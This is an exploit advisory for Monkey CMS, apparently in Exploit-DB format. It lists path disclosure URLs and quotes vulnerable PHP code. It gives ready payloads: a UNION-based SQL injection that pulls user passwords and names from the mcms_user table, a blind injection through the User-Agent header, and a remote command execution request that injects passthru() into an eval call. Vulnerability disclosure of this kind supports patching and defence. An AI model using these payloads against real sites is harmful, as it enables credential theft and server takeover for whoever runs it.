# Exploit Title: Monkey CMS - Multiple Vulnerabilities
# Date: 2013 17 June
# Exploit Author: Yashar shahinzadeh & Mormoroth
# Vendor Homepage: http://www.monkeycms.com/
# Tested on: Linux & Windows, PHP 5.3.10
# Affected Version : All versions
# Contacts: { http://Twitter.com/YShahinzadeh , http://Twitter.com/Mormoroth }
###########################################################################################

Summary:
========
1. Local path disclosure
2. MySQL Injection (Error based)
3. MySQL Injection (Time based blind)
4. Remote command execution
5. More
 

1. Local path disclosure:
=========================
http://site.com/[Path of Monkey CMS]/admincp/phpinfo.php
http://site.com/[Path of Monkey CMS]/admincp/classes/database.php

2. MySQL Injection (Error based):
=================================
Vulnerable lines of advancedsearch.php (Lines from 23 through 50):

...
...
case &#039;advancedsearch.php&#039;:
      $action = $_GET[&#039;action&#039;];
      $asstart = $_GET[&#039;asstart&#039;];
      $contentelement = $_GET[&#039;contentelement&#039;];
      $definitionid = $_GET[&#039;definitionid&#039;];
      $direction = $_GET[&#039;direction&#039;];
      $enddate = $_GET[&#039;enddate&#039;];
      $orderby = $_GET[&#039;orderby&#039;];
      $perpage = $_GET[&#039;perpage&#039;];
      $searchid = $_GET[&#039;searchid&#039;];
      $searchterm = $_GET[&#039;searchterm&#039;];
      $startdate = $_GET[&#039;startdate&#039;];
      $typeid = $_GET[&#039;typeid&#039;];
break;
...
...

Vulnerable lines of advancedsearch2.php (Lines from 23 through 50):

...
...
case &#039;advancedsearch2.php&#039;:
      $action = $_POST[&#039;action&#039;];
      $asstart = $_POST[&#039;asstart&#039;];
      $contentelement = $_POST[&#039;contentelement&#039;];
      $definitionid = $_POST[&#039;definitionid&#039;];
      $direction = $_POST[&#039;direction&#039;];
      $enddate = $_POST[&#039;enddate&#039;];
      $orderby = $_POST[&#039;orderby&#039;];
      $perpage = $_POST[&#039;perpage&#039;];
      $searchterm = $_POST[&#039;searchterm&#039;];
      $startdate = $_POST[&#039;startdate&#039;];
      $typeid = $_POST[&#039;typeid&#039;];
break;
...
...


Exploit (POST request to pages above):

action=search&asstart=0&contentelement=1&definitionid=1 UNION ALL SELECT NULL,CONCAT(0x3a6c70653a,password,0x766763616b68,user_name,0x3a626e743a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM monkey.mcms_user


3. MySQL Injection (Time based blind):
======================================
Vulnerable lines of global.php (Lines 456,526): 

...
...
"insert into guests (ip_address, datetime, user_agent, is_bot, last_page) values (&#039;$ip&#039;, &#039;".date("Y-m-d H:i:s")."&#039;, &#039;".$_SERVER[&#039;HTTP_USER_AGENT&#039;]."&#039;, &#039;".$ib."&#039;, &#039;".selfURL()."&#039;)";
...
...


Exploit (POST request to pages "index.php","login.php",ETC): Attack is capable of injecting by USER_AGENT

4. Remote command execution:
============================
Vulnerable lines of functions.php (Lines 2272,2273): 

...
...
$strCommand = "\$p = \$arrayFunctions[$function[0]"."_parameters];";
eval($strCommand);
...
...

Exploit (GET request):
http://site.com/[Path of Monkey CMS]/index.php?page=TagIndex&tags=${passthru(&#039;dir&#039;)}

Note that nny function which can issue server side command can be used instead of passthru(), i.e. shell_exec()

5. More
============================
There were also some unimportant vulnerabilities we haven&#039;t mentioned.

